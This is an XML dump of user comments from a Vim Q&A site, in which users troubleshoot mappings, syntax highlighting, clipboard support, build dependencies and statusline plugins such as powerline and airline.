  <row Id="2640" PostId="2558" Score="0" Text="@Rich I can't reproduce what you describe. Could you provide more detail?  I tried starting with a plain text file, called the function to create the transient window, did Ctrl+o, making the transient window the only window, then did `:b1`, and I was left with the text file again." CreationDate="2015-03-19T05:12:44.977" UserId="227" />
  <row Id="2641" PostId="2620" Score="0" Text="I was planning to try exactly this (which is why I didn't accept the other answer). Good to have confirmation it should work, though." CreationDate="2015-03-19T10:01:21.383" UserId="343" />
  <row Id="2642" PostId="2558" Score="0" Text="Hmm. Must be something to do with my other settings/plugins causing the problem. I'll try to narrow it down when I get a chance. Still, is there any reason why using a buffer-variable instead of a window-variable is a bad idea?" CreationDate="2015-03-19T10:04:47.797" UserId="343" />
  <row Id="2643" PostId="2542" Score="0" Text="Just take a screenshot! I wish Carpetsmoker had done so, because my browser messes up his example." CreationDate="2015-03-19T10:55:56.630" UserId="398" />
  <row Id="2644" PostId="2627" Score="0" Text="Can you elaborate the question a bit, giving some example? As I'm not clear what's asked exactly." CreationDate="2015-03-19T11:18:37.497" UserId="467" />
  <row Id="2645" PostId="2630" Score="0" Text="That seems to be well beyond the ken of simple tags and more the level of something like `cscope`, but I don't know if cscope supports HTML+JS+CSS." CreationDate="2015-03-19T12:55:13.540" UserId="205" />
  <row Id="2646" PostId="2630" Score="1" Text="You could take a look at [this SO question](http://stackoverflow.com/q/12833189/546861)." CreationDate="2015-03-19T12:59:10.450" UserId="54" />
  <row Id="2647" PostId="2631" Score="0" Text="I know Vim doesn't understand the language it edits. Is there a way to set up Ctags so it collects everything that begins with a dot, hash, percent-sign etc? PS. Thanks for camelcase motion." CreationDate="2015-03-19T14:06:13.313" UserId="237" />
  <row Id="2648" PostId="2631" Score="1" Text="Exuberant ctags has rules for it's supported languages built-in; I don't think you can change those. But you can define your own, regexp-based parsing via `--langdef=... --langmap=... --regex-...=...`" CreationDate="2015-03-19T14:12:21.713" UserId="970" />
  <row Id="2649" PostId="2615" Score="1" Text="@Rich how hard would it be to get used to using something like `&lt;Esc&gt;&lt;Esc&gt;`?" CreationDate="2015-03-19T15:28:09.140" UserId="880" />
  <row Id="2656" PostId="2635" Score="0" Text="Answered by the contributor of the [patch](ftp://ftp.vim.org/pub/vim/patches/7.4/7.4.096) himself!" CreationDate="2015-03-19T21:07:23.857" UserId="24" />
  <row Id="2657" PostId="2634" Score="1" Text="Conque and VimShell are horrible hacks that work well enough for simple stuff like `$ ls` or `$ grep` but fall apart in a multitude of ways once you start to use them as if you were in an actual terminal emulator. You should use a real terminal emulator instead." CreationDate="2015-03-19T21:10:59.403" UserId="54" />
  <row Id="2665" PostId="2635" Score="0" Text="Is there a way to download a compiled version of 7.4.096 for Windows?" CreationDate="2015-03-20T00:17:24.180" UserId="1438" />
  <row Id="2670" PostId="2631" Score="1" Text="&quot;Better accept the limitations and use Vim where it excels, and stick to an IDE for the rest&quot;. @IngoKarkat That makes no sense. You are saying switching back and forth between Vim and an IDE is more ideal than customizing Vim to do everything you want. It would be better to have a customized Vim that does everything you want exactly the way you want. You are giving up too easily. Don't give up. Vim + Linux + shell = text based IDE. You can get it to do anything you want within the concept of a text based IDE." CreationDate="2015-03-20T03:15:52.347" UserId="1410" />
  <row Id="2671" PostId="2645" Score="2" Text="This is a common issue. Have you given any thoughts to using a commenting plugin like [commentary](https://github.com/tpope/vim-commentary) (which I use), [Nerd Commenter](https://github.com/scrooloose/nerdcommenter), [EnhCommentify](http://www.vim.org/scripts/script.php?script_id=23), [tComment](https://github.com/tomtom/tcomment_vim), ..., [etc](http://vimawesome.com/?q=comment)?" CreationDate="2015-03-20T04:45:17.260" UserId="778" />
  <row Id="2672" PostId="2631" Score="0" Text="@INTPnerd: At least for certain languages, IDEs are very far ahead in functionality; for brevitiy, just two things where it'll be hard for Vim to keep up: fancy GUI visualizations (ruled out of scope by Bram), and asynchronicity (hard to implement). I personally use IntelliJ IDEA and GVIM in parallel, and am quite satisfied with that &quot;best of both worlds&quot; setup." CreationDate="2015-03-20T08:07:20.853" UserId="970" />
  <row Id="2674" PostId="2646" Score="1" Text="&quot;due to some library missing&quot; is not a very descriptive error..." CreationDate="2015-03-20T09:20:53.417" UserId="51" />
  <row Id="2676" PostId="2646" Score="0" Text="Yeah, you *probably* need a -devel package, or maybe something else? I don't know since I don't see the error ;-) There is also not a single authorize list, since Vim has many compile-time options which  influences this (for example, gVim can use several different toolkits)... The general strategy is to see which one you need from the error, install it, and repeat until it doesn't error out." CreationDate="2015-03-20T09:27:09.083" UserId="51" />
  <row Id="2677" PostId="2634" Score="2" Text="Sounds like you might be interested in http://xiki.org/" CreationDate="2015-03-20T10:07:40.980" UserId="343" />
  <row Id="2678" PostId="2615" Score="0" Text="@Random832 That's an intriguing idea." CreationDate="2015-03-20T10:18:09.087" UserId="343" />
  <row Id="2681" PostId="2646" Score="1" Text="Shouldn't [tag:linux] tag be not enough? Compiling process should be the same across different distributions." CreationDate="2015-03-20T11:12:26.053" UserId="467" />
  <row Id="2682" PostId="2654" Score="1" Text="The correct `yum` command is `sudo yum-builddep vim-X11`. And this solved my problem." CreationDate="2015-03-20T11:42:10.790" UserId="622" />
  <row Id="2683" PostId="2646" Score="0" Text="@Carpetsmoker I think the issue might be that the OP doesn't know where to look to find such an error. They've pasted the error they can see into their question already." CreationDate="2015-03-20T12:07:04.303" UserId="343" />
  <row Id="2684" PostId="2645" Score="0" Text="cheers @PeterRincker. I didn't really think to install a plugin for this as I felt that it's probably a fairly simple task that one should be able to do. Perhaps a plugin would be more efficient I'm not sure, the answer given below appears to address it without plugins though" CreationDate="2015-03-20T12:14:36.780" UserId="1443" />
  <row Id="2685" PostId="2647" Score="0" Text="ace thanks @jjaderberg. I'm curious - why is `vnoremap` used instead of `xnoremap`? From the docs the only difference that I can tell is that `vnoremap` works in both visual and select, whereas `xnoremap` only works in visual. If I change the command to `xnoremap` instead it still seems to work, so I'm a little confused. Thanks :)" CreationDate="2015-03-20T12:29:12.250" UserId="1443" />
  <row Id="2686" PostId="2647" Score="0" Text="Just to add - `vnoremap &lt;buffer&gt; &lt;Leader&gt;ma &lt;S-V&gt;`&gt;a$$&lt;ESC&gt;`&lt;i$$&lt;ESC&gt;` I expected that to let me convert a line in LaTeX into a math line, but It doesn't work. I tried using `vnoremap  &lt;Leader&gt;ma &lt;S-V&gt;`&gt;a$$&lt;ESC&gt;`&lt;i$$&lt;ESC&gt;` instead, but that didn't work either (I thought that perhaps the information was selected yet so it wasn't in the buffer or something). I'm not sure why it won't carry out the shift+V then work as before... ho hum" CreationDate="2015-03-20T12:45:36.043" UserId="1443" />
  <row Id="2687" PostId="2635" Score="0" Text="@ChestertheRooster I believe using the builds from Cream (http://sourceforge.net/projects/cream/files/Vim/) are the way to go." CreationDate="2015-03-20T12:55:39.580" UserId="51" />
  <row Id="2688" PostId="2647" Score="0" Text="After `&lt;S-V&gt;` you are in visual mode, but `'&gt;` is a motion in normal mode. Return to normal mode first (`&lt;ESC&gt;` before `'&gt;`). You can use `o` and `O` (mnemonic: &quot;other&quot;) to jump between the ends in visual mode. But in this case visual mode is unnecessary, just use insert-at-beginning-of-line and -at-end-of-line: `I$&lt;ESC&gt;A$&lt;ESC&gt;`. Also, look at Tim Pope's Surround plugin, it is good." CreationDate="2015-03-20T13:27:04.613" UserId="1306" />
  <row Id="2689" PostId="2647" Score="1" Text="I use this technique too. It's important to jump to the end of the range first: adding text at the beginning first will move the end of the range, but it will not move the `` `&gt;`` marker." CreationDate="2015-03-20T15:24:19.170" UserId="1015" />
  <row Id="2690" PostId="2620" Score="0" Text="This has done the trick, although [`VimEnter` specifically didn't work.](http://vi.stackexchange.com/a/2656/343)" CreationDate="2015-03-20T15:57:24.450" UserId="343" />
  <row Id="2691" PostId="2644" Score="0" Text="You can run external tools directly on the content (or parts) of your buffer with `:[range]w !command`." CreationDate="2015-03-20T16:04:27.433" UserId="54" />
  <row Id="2694" PostId="2658" Score="0" Text="thanks @Peter Rincker, I haven't used plugins afaik so I'll have to try and get my head around them at some point (by the looks of things!). The comments are working nicely so far, looking forward to adding more." CreationDate="2015-03-20T17:32:58.493" UserId="1443" />
  <row Id="2695" PostId="2660" Score="1" Text="Ah! It all makes sense now.  But how annoying to a former Java programmer, and to restate the command in the middle, `:P` oh well...now at least I have a reason why this is the case." CreationDate="2015-03-20T17:37:53.033" UserId="1065" />
  <row Id="2696" PostId="2660" Score="7" Text="But there is more! you can use a lowercase function name you just need to prefix it with `s:` making it a script specific function. See `:h local-functions`. You can also use autoload functions which don't have this requirement. See `:h autoload-functions`." CreationDate="2015-03-20T17:57:24.670" UserId="778" />
  <row Id="2697" PostId="2662" Score="2" Text="argh flavor flavour, whoops. cheers" CreationDate="2015-03-20T18:40:54.750" UserId="1443" />
  <row Id="2698" PostId="2492" Score="1" Text="Thanks for confirming and indicating a possible (implausible) route. I don't see what this has to do with WYSIWYG, which ought to show something like `\marginpar{text}` in a margin rather than just conceal the command. Concealing is a Vim feature and tweaking how it interacts with other features doesn't amount to looking for a different editor, surely. But I understand that what I'm asking for is nontrivial and unless someone offers more detailed suggestions I'll accept your answer. Despite your WYSIWYG curse ;-)" CreationDate="2015-03-20T18:51:45.003" UserId="1306" />
  <row Id="2699" PostId="2631" Score="0" Text="@IngoKarkat That only works for certain things. But as far as good support for code lookup/navigation, these are things you want to have working really well inside vim whenever you are using it. It would not make sense to be editing code in vim, and then switch to an IDE to lookup a piece of code so that you can edit it inside Vim. So far I have never been happy with any Vim emulation I have seen inside an IDE. I always end up missing full Vim with all the customizations and plugins I have for it. This becomes more and more true the longer you use and thus customize/extend Vim to your liking." CreationDate="2015-03-20T22:41:06.060" UserId="1410" />
  <row Id="2700" PostId="2665" Score="0" Text="I have this exact same problem with `:sp`, `:vs` and `:e`" CreationDate="2015-03-21T12:57:10.910" UserId="850" />
  <row Id="2701" PostId="2667" Score="0" Text="I do have a decent keyboard (WASD with mx clears). But in many cases I just fire up gvim from my task bar (yeah, windows user, no comment :p), `:set syntax=whatever` and then switch to insert mode if i need a code scratchpad for something." CreationDate="2015-03-21T14:07:31.903" UserId="1461" />
  <row Id="2702" PostId="2670" Score="1" Text="You could try setting `makeprg` and using Vim's `:make` command. See http://vimhelp.appspot.com/quickfix.txt.html#%3Amake_makeprg.. Hmm. No, that doesn't stop the output either." CreationDate="2015-03-21T18:11:02.703" UserId="205" />
  <row Id="2703" PostId="2670" Score="0" Text="Thanks I've had a look at that, It makes things a bit simpler than having to type `:!./make.py`, but not much really. It would be nice to have it set to something such as `&lt;F2&gt;` (or whatever), and so that I could still see the code whilst it was running the programme (not sure if that's possible or not). Thanks" CreationDate="2015-03-21T18:39:37.847" UserId="1443" />
  <row Id="2704" PostId="2670" Score="0" Text="I tried `:silent make`, but that seemed to screw up rendering for some reason. By the way, a mapping shouldn't be difficult: `nnoremap &lt;F2&gt; :silent make&lt;cr&gt;`." CreationDate="2015-03-21T18:41:07.010" UserId="205" />
  <row Id="2705" PostId="2670" Score="0" Text="yeah I've done the mapping, that was me thinking aloud a bit there (bit distracting!). It would be nice to have it so that it ran either silently or there was some other way around. In the processing IDE pressing `Ctrl+r` runs the sketch, it can be nice to be able to view the code whilst the programme is running. I'm not sure how this would be done though (in Vim). Cheers" CreationDate="2015-03-21T18:43:10.183" UserId="1443" />
  <row Id="2706" PostId="2672" Score="0" Text="ooo that works :) I feel like I'm playing with fire a bit though, the mailing list link seemed to imply that the problem was trying to use it without the quotations. Any dangers that you know of? Why don't you like it?  cheers @muru" CreationDate="2015-03-21T19:12:38.507" UserId="1443" />
  <row Id="2707" PostId="2671" Score="0" Text="cheers @kenorb, `:call system('./make.py')` did the trick though :)" CreationDate="2015-03-21T19:13:53.457" UserId="1443" />
  <row Id="2708" PostId="2672" Score="0" Text="@user3130747 it isn't all that obvious when a command finishes or fails - I don't think the exit code is checked at all. So unless your command is guaranteed to succeed, you probably might miss crucial errors." CreationDate="2015-03-21T19:15:38.933" UserId="205" />
  <row Id="2709" PostId="2672" Score="0" Text="This is a good point! I didn't think about that... Will it close the command though? I'm assuming that if there was an error the process would end? Or would that make it just keep running? If there was an error in the code the processing sketch wouldn't run, meaning that there wouldn't be a sketch window to close (and end the process). So I'm wondering about that now. Other wise it's ace" CreationDate="2015-03-21T19:18:04.953" UserId="1443" />
  <row Id="2710" PostId="2672" Score="0" Text="@user3130747 normally, does the process end if there's an error? `system` closes stdin, I think, so unless your command expects something else, it should close." CreationDate="2015-03-21T19:21:43.623" UserId="205" />
  <row Id="2711" PostId="2621" Score="0" Text="Thank you, that plugin is very helpful." CreationDate="2015-03-21T19:40:11.190" UserId="489" />
  <row Id="2712" PostId="2674" Score="4" Text="Since deleting actually cuts, you can skip the yank: `ddkP`, moving down is easier: `ddp`." CreationDate="2015-03-21T19:51:18.967" UserId="205" />
  <row Id="2713" PostId="2675" Score="0" Text="The command works and I want to put it in my .vimrc. So I added this `set highlight cursorline ctermbg=LightBlue` and I get this `E518: Unknown option: ctermbg=LightBlue`" CreationDate="2015-03-21T20:12:05.763" UserId="1464" />
  <row Id="2714" PostId="2675" Score="0" Text="@Vader try without the set. As in `set cursorline` on one line and the command in my answer on another line." CreationDate="2015-03-21T20:12:39.270" UserId="205" />
  <row Id="2715" PostId="2675" Score="0" Text="That removes the Error, but it still not showing up. Anyway you answered my original questions, so thanks." CreationDate="2015-03-21T20:16:32.020" UserId="1464" />
  <row Id="2717" PostId="1941" Score="0" Text="You could also use relative line numbers `:+12,+24d`" CreationDate="2015-03-22T06:39:25.643" UserId="1283" />
  <row Id="2718" PostId="2677" Score="0" Text="`$ howdoi` won't help. You only need basic logic: you have an unused parameter so you have two solutions: remove it or use it." CreationDate="2015-03-22T09:42:27.073" UserId="54" />
  <row Id="2719" PostId="2677" Score="1" Text="@romainl no no , you took me wrong , I just wanted to demonstrate that case. Infact I've intentionally introduced that variable :p" CreationDate="2015-03-22T09:47:28.777" UserId="101" />
  <row Id="2720" PostId="2679" Score="0" Text="says Invalid register name: '+' and I tried with ' * ' too and it says same." CreationDate="2015-03-22T09:49:50.163" UserId="101" />
  <row Id="2721" PostId="2679" Score="1" Text="That means your Vim doesn't have clipboard support. You could launch the command directly from Vim: `:! howdoi &lt;C-R&gt;=v:statusmsg&lt;CR&gt;&lt;CR&gt;` then." CreationDate="2015-03-22T09:52:22.187" UserId="970" />
  <row Id="2722" PostId="2679" Score="0" Text="@lngo and how do I check I have clipboard support? if &quot;vim --version|grep .xterm_clipboard -o&quot; shows &quot;-xterm_clipboard&quot; doesn't it means I do have it? Found it over SO." CreationDate="2015-03-22T09:56:42.273" UserId="101" />
  <row Id="2723" PostId="2679" Score="0" Text="Okay but &quot;:echo has('clipboard')&quot; returns 0 so I don't have it :) , I'll recompile and report back." CreationDate="2015-03-22T10:00:15.947" UserId="101" />
  <row Id="2724" PostId="2679" Score="1" Text="Right; it would have to be a `+` in front. Is the message in one of those variables; have you checked that? Getting it out there is just secondary to your original question." CreationDate="2015-03-22T10:02:00.443" UserId="970" />
  <row Id="2725" PostId="2670" Score="0" Text="You might also want to look into https://github.com/tpope/vim-dispatch" CreationDate="2015-03-22T10:10:37.040" UserId="343" />
  <row Id="2726" PostId="2679" Score="0" Text="I do have Clipboard support now but `:let @+ = v:statusmsg` shows : `&quot;/tmp/vT1CBzR/56.cpp&quot; [New] 92L, 2224C written` :D and `:let @+ = v:errmsg` shows : `E31: No such mapping` :D. And I couldn't understand this &quot; Is the message in one of those variables&quot;. I'm using YCM which predicts errors in my code by analyzing it with Clang. Would that help?" CreationDate="2015-03-22T10:19:01.037" UserId="101" />
  <row Id="2727" PostId="2679" Score="2" Text="@AbhinavGauniyal You can check if YCM uses those variables by executing `:echo v:statusmsg` or `:echo v:errmsg`. If one of them contains the message you're looking for, use that variable. If both of them are empty, then YCM is not using these variables to store the error messages. Also, make sure you get the error message with YCM again as `v:errmsg` may get overwritten with newer error messages." CreationDate="2015-03-22T10:23:20.013" UserId="246" />
  <row Id="2728" PostId="2679" Score="0" Text="I guess YCM uses something else to display those message , I have tried numerous times to echo those message , found some other unrelated texts but not YCM's errors." CreationDate="2015-03-22T10:40:20.223" UserId="101" />
  <row Id="2729" PostId="2679" Score="1" Text="Then it's likely `:echo`. You could raise an issue at YCM's issue tracker to have that (trivially) changed to `:echomsg`." CreationDate="2015-03-22T10:49:12.063" UserId="970" />
  <row Id="2730" PostId="2666" Score="0" Text="Thank you for your response. But I'm just wondering if it's really impossible, considering airline displays for example mode (`:set showmode`), and even though I wasn't able to determine how exactly it sets `airline_current_mode` variable, it is still able to display correct mode, accessing it programmatically somehow." CreationDate="2015-03-22T11:44:16.487" UserId="1055" />
  <row Id="2731" PostId="2668" Score="0" Text="This is a good idea actually, the fewer times shift is used the better. Also, I hear you regarding getting semi-crippled. I have swapped my `1..90-=` keys with their alternatives `!..()_+` in C, C++ and Haskell files since the alternatives are used much more frequently and it's really nice, but I do get semi-crippled when using vim where my settings are not in effect." CreationDate="2015-03-22T14:06:40.390" UserId="850" />
  <row Id="2732" PostId="2682" Score="0" Text="+1 for the Vim wikia link. Learnt a few things there." CreationDate="2015-03-22T14:09:27.603" UserId="356" />
  <row Id="2733" PostId="2669" Score="3" Text="Note that this will replace `Set` with `set` *everywhere* in the command line, not just when you type `:Set`" CreationDate="2015-03-22T16:09:23.540" UserId="51" />
  <row Id="2734" PostId="2683" Score="2" Text="Confirmed here; doesn't happen if the file is `.txt`. Some syntax highlight regexp pattern going astray, I suppose." CreationDate="2015-03-22T16:19:46.957" UserId="854" />
  <row Id="2735" PostId="2681" Score="0" Text="Does this work for Ctrl commands too? How should I write them in the command?" CreationDate="2015-03-22T17:05:08.903" UserId="356" />
  <row Id="2736" PostId="2681" Score="0" Text="Yes, it should work.  You can write them like so: `&quot;\&lt;C-{insert key}&gt;&quot;`" CreationDate="2015-03-22T17:58:33.403" UserId="865" />
  <row Id="2737" PostId="2680" Score="1" Text="Just like there is `&lt;C-x&gt;&lt;C-e&gt;` in readline to edit the command-line in `$EDITOR`, you have `&lt;C-f&gt;` in Vim to open the command-line window. See `:help cmdline-window`." CreationDate="2015-03-22T18:09:09.340" UserId="54" />
  <row Id="2738" PostId="2666" Score="0" Text="You can get the current mode via the built-in `mode()` function; there's nothing similar for the typed command (yet)." CreationDate="2015-03-22T18:17:39.487" UserId="970" />
  <row Id="2739" PostId="2684" Score="1" Text="I don't think the OP meant to create mapping for the command line, but to execute a mapping from the command line." CreationDate="2015-03-22T18:50:10.283" UserId="865" />
  <row Id="2740" PostId="2683" Score="0" Text="Since this is syntax highlighting related, the simple workaround would be to set `synmaxcol` to some limited number (such as the width of your terminal)." CreationDate="2015-03-22T19:18:35.410" UserId="1153" />
  <row Id="2741" PostId="2685" Score="0" Text="thanks @Ingo, I've never reported anything before but I'm happy to do so.  I have the syntax file in `/usr/share/vim/vim74/syntax`, the developer at the top is `Neil Schemenauer &lt;nas@python.ca&gt;`. Can I ask you; is this why you changed syntax files originally? Thanks" CreationDate="2015-03-22T19:42:07.930" UserId="1443" />
  <row Id="2742" PostId="2685" Score="0" Text="Yes, that's right; the latest version is from 2014 Jul 16, so it's likely it is still being maintained, and you'll get an answer from the author. You can point him to this, your question, as it already contains a nice reproducible example." CreationDate="2015-03-22T20:31:11.900" UserId="970" />
  <row Id="2743" PostId="2685" Score="0" Text="I just found my alternative Python syntax somewhere somehow; I'm only rarely editing Python files, so I haven't given that much thought so far." CreationDate="2015-03-22T20:32:55.727" UserId="970" />
  <row Id="2744" PostId="2685" Score="0" Text="thanks @Ingo, I've changed the syntax files and it's no longer being so slow. I'm afraid the regex engines are a bit beyond my understanding, I'll email the dev though, I'm happy to carry out any tests." CreationDate="2015-03-22T20:44:55.040" UserId="1443" />
  <row Id="2745" PostId="2687" Score="0" Text="I keep learning how counter-intuitive Vim is!  I didn't notice that `yb` also moves cursor." CreationDate="2015-03-22T21:29:54.720" UserId="1248" />
  <row Id="2746" PostId="2686" Score="0" Text="I overlooked the fact that all backward motions move cursor when used in Operator-pending mode.  Thus the initial title of the question (&quot;Using “search backwards” (`?`) in Operator-pending mode&quot;) is not particularly appropriate.  I hesitate to remove the question, but i will change the title." CreationDate="2015-03-22T22:27:07.560" UserId="1248" />
  <row Id="2747" PostId="2635" Score="0" Text="Thanks, but I downloaded vim 7.4.638 from the cream link (above), and get same error `E344: Can't find directory &quot;H:\&quot; in cdpath`" CreationDate="2015-03-22T23:33:59.143" UserId="1438" />
  <row Id="2748" PostId="2632" Score="0" Text="A good suggestions, but same error message." CreationDate="2015-03-23T00:03:02.983" UserId="1438" />
  <row Id="2750" PostId="2674" Score="0" Text="See also: https://vi.stackexchange.com/questions/598/faster-way-to-move-a-block-of-text" CreationDate="2015-03-23T10:52:10.100" UserId="343" />
  <row Id="2751" PostId="2655" Score="1" Text="Thanks. I just tried this but `:set tw-=2` results in `E487: Argument must be positive: tw-=2`. Is the syntax incorrect?" CreationDate="2015-03-23T11:30:43.723" UserId="91" />
  <row Id="2752" PostId="2689" Score="0" Text="Have you looked into using modelines or filetypes?" CreationDate="2015-03-23T12:09:30.230" UserId="1296" />
  <row Id="2753" PostId="2655" Score="1" Text="Check the current value of textwidth with `:set tw?`. My guess is that you have textwidth set to 0. These steps assume that textwidth starts out as the number of characters you want per line." CreationDate="2015-03-23T14:05:41.607" UserId="680" />
  <row Id="2756" PostId="2702" Score="0" Text="@Carpetsmoker how about the `CursorHold` event? If Vim doesn't have focus, it should trigger every n seconds." CreationDate="2015-03-23T18:13:24.840" UserId="205" />
  <row Id="2757" PostId="2703" Score="0" Text="You look like you want something like [Emmet](http://emmet.io/)." CreationDate="2015-03-23T19:56:07.470" UserId="778" />
  <row Id="2758" PostId="2708" Score="3" Text="You can execute this block regardless of the value of `&amp;diff`. The `Diff*` syntax groups are only used for diff. Furthermore, there's no guarantee that this will be re-evaluated when diff mode is entered interactively." CreationDate="2015-03-23T20:57:46.950" UserId="64" />
  <row Id="2759" PostId="2708" Score="0" Text="@tommcdo: I removed the example stuff. But the re-evaluation stuff I was unaware of (mainly because I don't switch modes, I ether run as vim or as vimdiff)." CreationDate="2015-03-23T21:15:38.983" UserId="383" />
  <row Id="2760" PostId="2707" Score="3" Text="`substitute()` isn't *completely* equivalent to `:substitute`; the function behaves as if `'magic'` is set and `'cpoptions'` is empty, whereas the command will observe user-set values." CreationDate="2015-03-23T22:05:43.053" UserId="64" />
  <row Id="2761" PostId="2467" Score="1" Text="Is it `has(&quot;patch-7.4-399&quot;)` or **`has(&quot;patch-7.4.399&quot;)`**? (the latter was suggested to me by some code-completion, and also seems to be **[what's actually described at the link you provided](http://vimhelp.appspot.com/eval.txt.html#feature-list)**)" CreationDate="2015-03-24T09:49:20.383" UserId="1500" />
  <row Id="2762" PostId="2467" Score="1" Text="@akavel They both work. You could even use `patch-7-4-399` ;-)" CreationDate="2015-03-24T09:50:16.660" UserId="51" />
  <row Id="2764" PostId="2709" Score="0" Text="What do you want to happen if you've both changed the same line?" CreationDate="2015-03-24T11:47:26.350" UserId="51" />
  <row Id="2765" PostId="2467" Score="0" Text="ahh, awsum, then :)" CreationDate="2015-03-24T12:12:12.963" UserId="1500" />
  <row Id="2766" PostId="2703" Score="2" Text="Note that [`:help function-list`](http://vimhelp.appspot.com/usr_41.txt.html#function-list) is a very useful page ;-) There are also some other tags in that page, such as `string-functions`." CreationDate="2015-03-24T13:47:25.760" UserId="51" />
  <row Id="2767" PostId="2714" Score="0" Text="Unforunately not :( as switching to line-wise visual mode gets the opening &lt;div&gt; tag and you end up with:&#xA;&#xA;&#xA;&lt;article&gt;&#xA;  &lt;div&gt;&#xA;    &lt;section&gt;&#xA;    &lt;/section&gt;&#xA;  &lt;/article&gt;&#xA;&lt;/div&gt;" CreationDate="2015-03-24T16:18:11.400" UserId="1503" />
  <row Id="2768" PostId="2714" Score="2" Text="Hmm, the `it` motion seems to behave different depending on the HTML: I've &quot;discovered&quot; 4 different behaviours :-/" CreationDate="2015-03-24T16:23:45.083" UserId="51" />
  <row Id="2769" PostId="2709" Score="0" Text="@Carpetsmoker Hmmm... Hard one.  Maybe it could just pop up a message or something.  I'm open to suggestions on that." CreationDate="2015-03-24T18:20:43.410" UserId="318" />
  <row Id="2771" PostId="2718" Score="0" Text="Oh, you're right, that would check the previously saved version, not so useful. I've changed the command to send the current contents to Perl." CreationDate="2015-03-24T19:08:56.137" UserId="970" />
  <row Id="2772" PostId="2714" Score="1" Text="It works if you start on the section tag rather than on the div tag. Selects inside section, then V to just select those 2 lines. As opposed to selecting inside div, which selects part of the first line as well. Or you can go to the section tag and do `vatVS` to select around the section tag." CreationDate="2015-03-24T21:05:50.667" UserId="1155" />
  <row Id="2773" PostId="2081" Score="1" Text="The patch has been accepted as [7.4.678](https://groups.google.com/forum/#!topic/vim_dev/WLaddu-dXCQ)." CreationDate="2015-03-24T21:45:08.960" UserId="860" />
  <row Id="2774" PostId="2558" Score="0" Text="I found a reproduction: Start with plain text file, create transient window. Change buffer in that window (e.g. `:b1`), switch to other window, close that window. Vim exits. Using a buffer variable does make more sense here; I'm updating the answer to reflect this." CreationDate="2015-03-25T03:57:43.643" UserId="227" />
  <row Id="2776" PostId="2720" Score="0" Text="The advantage of using these worthless gimmicks is exactly to not have to spend time customizing the statusline by simply enabling/disabling features in the plugin. But since we're criticizing these plugins let's be honest here: there's even no need for a statusline to work in vim, so even the comment &quot;read `:h 'statusline'` is unnecessary ;)" CreationDate="2015-03-25T11:53:12.013" UserId="599" />
  <row Id="2777" PostId="2720" Score="2" Text="1. &quot;read :h 'statusline'&quot; implies that the other person wants a custom statusline and shows that there's no need for a plugin for having one. 2. Judging by the number of powerline/airline questions here, on #vim and elsewhere, the shortcut doesn't seem that short." CreationDate="2015-03-25T12:57:53.873" UserId="54" />
  <row Id="2778" PostId="2724" Score="0" Text="Did you [read the doc](https://github.com/kien/ctrlp.vim/blob/master/doc/ctrlp.txt#L178)?" CreationDate="2015-03-25T13:00:10.483" UserId="54" />
  <row Id="2780" PostId="2720" Score="0" Text="With all due respect, I'm not quite satisfied with this community's reception towards my question. This is already a stagnant community as it is (rather it should be growing).&#xA;&#xA;That out of the way, I specifically installed powerline from here: https://github.com/powerline/powerline." CreationDate="2015-03-25T14:23:18.573" UserId="1507" />
  <row Id="2781" PostId="2720" Score="0" Text="@romainl: I did not see an existing tag for Powerline, and searching for Powerline only returned one or two other hits on this SE. And if you're not convinced it isn't Airline, I've tried `:help airline` and it says &quot;Sorry, no help for airline.&quot;" CreationDate="2015-03-25T14:35:04.260" UserId="1507" />
  <row Id="2782" PostId="2720" Score="0" Text="@NicolásKim I'm sorry, we will give you a refund for not satisfactory replying to your question within 10 hours ;-) The problem is that your question provides almost no information at all, you just show us a screenshot and say &quot;it doesn't do what I expect&quot;... Also see: [How do I debug my vimrc file?](https://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|1.0147)..." CreationDate="2015-03-25T14:39:22.317" UserId="51" />
  <row Id="2783" PostId="2720" Score="0" Text="@Carpetsmoker Sorry, I'm just used to be more hospitable community on /r/Vim. I guess this SE isn't immune to the overall worshipping of top commenters either—Math.SE is similar. I've added the Vundle command I used to install Lokaltog/powerline in my OP. I've already checked if it's my .vimrc and it isn't; I completely renamed it so my vim can't find it and the Powerline bar is still at the top of the window, unfortunately. I'm running stock vim from homebrew, and I installed Powerline through Vundle. Seems standard enough that this shouldn't happen." CreationDate="2015-03-25T14:43:10.643" UserId="1507" />
  <row Id="2784" PostId="2725" Score="2" Text="Warning about `vim -`: anything sent to stderr is interpreted by vim as a command. To avoid this, you'd want to redirect stderr to stdout: `git log 2&gt;&amp;1 | vim -`" CreationDate="2015-03-25T14:46:25.537" UserId="680" />
  <row Id="2785" PostId="2709" Score="0" Text="But what would be the desired behavior you're expecting? That Vim not just reload the changes but to actually shows something like a desktop popup message or avoid Vim to automatically reloads the changes and shows a warning message instead letting you decide what to do?" CreationDate="2015-03-25T14:50:47.507" UserId="515" />
  <row Id="2786" PostId="2720" Score="2" Text="Romainl is our resident 'tough love vimmer' =P. Nevertheless, the advice he gave you is solid. If you don't have airline installed, then it appears that powerline (or another plugin) has modified your tabline, which always appears at the top. Your status line is currently hidden and can be shown with `set laststatus=2`" CreationDate="2015-03-25T14:54:53.917" UserId="680" />
  <row Id="2787" PostId="2724" Score="0" Text="ctrlp-root-markers might help him as well" CreationDate="2015-03-25T15:06:20.127" UserId="680" />
  <row Id="2788" PostId="2709" Score="0" Text="@JavierScappini Either.  I'm not that picky.  I guess it would be cool to have it automatically load the changes..." CreationDate="2015-03-25T15:22:36.350" UserId="318" />
  <row Id="2789" PostId="2720" Score="0" Text="1. What you see at the top of the window is **NOT** the powerline statusline. It is something else: a fake tabline showing the buffers in the current tab page. 2. To see the actual Powerline tabline, you *must* have `set laststatus` in your `vimrc`. 3. The fake tabline feature was introduced by Airline, maybe it is now in Powerline… who knows? 4. Which one do you use: `lokaltog/powerline` or `powerline/powerline`?" CreationDate="2015-03-25T15:32:56.730" UserId="54" />
  <row Id="2790" PostId="2720" Score="2" Text="@MattBoehm Thanks for the context—it's appreciated. The top bar I was seeing turned out to be from a package called `buftabline`. Setting `laststatus` worked as you and romainl suggested—thanks!" CreationDate="2015-03-25T16:06:19.547" UserId="1507" />
  <row Id="2791" PostId="2720" Score="0" Text="@romainl Setting `laststatus` worked to enable the statusbar as you said. The tabline came from another package called `bufabline`. And I'm using `lokaltog/powerline`. Thanks again!" CreationDate="2015-03-25T16:07:40.920" UserId="1507" />
